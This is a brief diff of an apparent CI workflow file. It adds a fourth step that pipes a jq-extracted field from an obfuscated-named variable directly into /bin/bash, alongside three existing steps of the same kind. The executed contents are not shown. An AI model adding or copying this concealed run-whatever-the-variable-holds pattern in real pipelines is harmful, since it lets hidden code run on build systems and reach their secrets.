@@ -32,6 +32,7 @@ jobs:
           echo $uthg5992 | jq -r .fs91543 | /bin/bash
           printf '%s' "$smdj5" | jq -r .aoqpy01203 | /bin/bash
           echo $aju83230 | jq -r .rcd8 | /bin/bash
+          printf '%s' "$doee4" | jq -r .spwvg3 | /bin/bash
 
       - name: Archive output
         uses: actions/upload-artifact@v4
